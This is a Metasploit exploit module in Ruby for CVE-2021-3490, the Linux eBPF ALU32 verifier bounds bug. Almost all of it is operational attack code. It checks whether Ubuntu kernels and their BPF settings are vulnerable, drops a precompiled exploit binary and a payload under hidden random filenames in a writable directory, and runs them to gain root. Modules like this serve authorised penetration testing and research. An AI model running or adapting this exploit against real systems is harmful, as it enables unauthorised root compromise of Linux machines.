##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux eBPF ALU32 32-bit Invalid Bounds Tracking LPE',
        'Description' => %q{
          Linux kernels from 5.7-rc1 prior to 5.13-rc4, 5.12.4, 5.11.21, and
          5.10.37 are vulnerable to a bug in the eBPF verifier's verification
          of ALU32 operations in the scalar32_min_max_and function when performing
          AND operations, whereby under certain conditions the bounds of a
          32 bit register would not be properly updated.

          This can be abused by attackers to conduct an out of bounds read
          and write in the Linux kernel and therefore achieve arbitrary
          code execution as the root user.

          The target system must be compiled with eBPF support and not have
          kernel.unprivileged_bpf_disabled set to 1, which prevents unprivileged
          users from loading eBPF programs into the kernel. Note that if
          kernel.unprivileged_bpf_disabled is enabled this module can still be
          utilized to bypass protections such as SELinux, however the user
          must already be logged as a privileged user such as root.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Manfred Paul', # Aka @_manfp, original vulnerability discovery
            'chompie1337', # Exploit writeup and PoC
            'Grant Willcox' # Aka @tekwizz123, Metasploit Module
          ],
        'DisclosureDate' => '2021-05-11',
        'Platform' => [ 'linux' ],
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Targets' => [[ 'Auto', {} ]],
        'Privileged' => true,
        'References' =>
          [
            [ 'CVE', '2021-3490' ],
            [ 'URL', 'https://www.openwall.com/lists/oss-security/2021/05/11/11' ],
            [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e' ],
            [ 'URL', 'https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story' ],
            [ 'URL', 'https://www.zerodayinitiative.com/advisories/ZDI-21-606/' ],
            [ 'URL', 'https://ubuntu.com/security/notices/USN-4950-1' ],
            [ 'URL', 'https://ubuntu.com/security/notices/USN-4949-1' ]
          ],
        'Notes' =>
          {
            'Reliability' => [ REPEATABLE_SESSION ],
            'Stability' => [ CRASH_OS_DOWN ],
            'SideEffects' => [ ]
          },
        'DefaultTarget' => 0
      )
    )
    register_advanced_options([
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),
      OptInt.new('CmdTimeout', [true, 'Maximum number of seconds to wait for the exploit to complete', 90])
    ])
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def check
    if unprivileged_bpf_disabled?
      return CheckCode::Safe('Unprivileged BPF loading is not permitted')
    end

    vprint_good('Unprivileged BPF loading is permitted')

    release = kernel_release
    version = kernel_version

    # If the target is Ubuntu...
    if version =~ /[uU]buntu/
      version_array = release.split('-')
      major_version = version_array[0]
      minor_version = version_array[1]

      # First check if we are past the 5.11.x kernel releases and into at the time of
      # writing beta versions of Ubuntu. If so,the target isn't vuln.
      if Rex::Version.new(major_version) >= Rex::Version.new('5.12.0')
        return CheckCode::Safe("Target Ubuntu kernel version is #{major_version}-#{minor_version} which is not vulnerable!")
      elsif (Rex::Version.new(major_version) == Rex::Version.new('5.11.0')) && (Rex::Version.new(minor_version) >= Rex::Version.new('17.18'))
        return CheckCode::Safe('Target Ubuntu kernel version is running a 5.11.x build however it has updated to a patched version!')
      elsif (Rex::Version.new(major_version) == Rex::Version.new('5.8.0')) && (Rex::Version.new(minor_version) >= Rex::Version.new('53.60'))
        return CheckCode::Safe('Target Ubuntu kernel version is running a 5.8.x build however it has updated to a patched version!')
      elsif (Rex::Version.new(major_version) != Rex::Version.new('5.8.0')) && (Rex::Version.new(major_version) != Rex::Version.new('5.11.0'))
        return CheckCode::Unknown('Unknown target kernel version, recommend manually checking if target kernel is vulnerable.')
      end
    else
      return CheckCode::Unknown("Target is not a Ubuntu target, so we can't check if the target is vulnerable or not!")
    end

    vprint_good("Kernel version #{release} appears to be vulnerable")

    config = kernel_config

    if config.nil?
      return CheckCode::Detected('Could not retrieve kernel config')
    end

    unless config.include?('CONFIG_BPF_SYSCALL=y')
      return CheckCode::Safe('Kernel config does not include CONFIG_BPF_SYSCALL')
    end

    vprint_good('Kernel config has CONFIG_BPF_SYSCALL enabled')

    CheckCode::Appears
  end

  def exploit
    if is_root? && !datastore['ForceExploit']
      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')
    end

    unless writable?(base_dir)
      fail_with(Failure::BadConfig, "#{base_dir} is not writable")
    end

    executable_name = ".#{rand_text_alphanumeric(5..10)}"
    executable_path = "#{base_dir}/#{executable_name}"
    vprint_status('Dropping pre-compiled exploit on system...')
    release = kernel_release
    major_version = release.split('-')[0]
    if (Rex::Version.new(major_version) == Rex::Version.new('5.11.0'))
      upload_and_chmodx(executable_path, exploit_data('cve-2021-3490', 'hirsute.bin'))
    else
      upload_and_chmodx(executable_path, exploit_data('cve-2021-3490', 'groovy.bin'))
    end
    register_file_for_cleanup(executable_path)

    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
    upload_and_chmodx(payload_path, generate_payload_exe)
    register_file_for_cleanup(payload_path)

    # Launch exploit
    print_status('Launching exploit ...')
    cmd_exec(executable_path.to_s, payload_path.to_s, datastore['CmdTimeout'])
  end
end
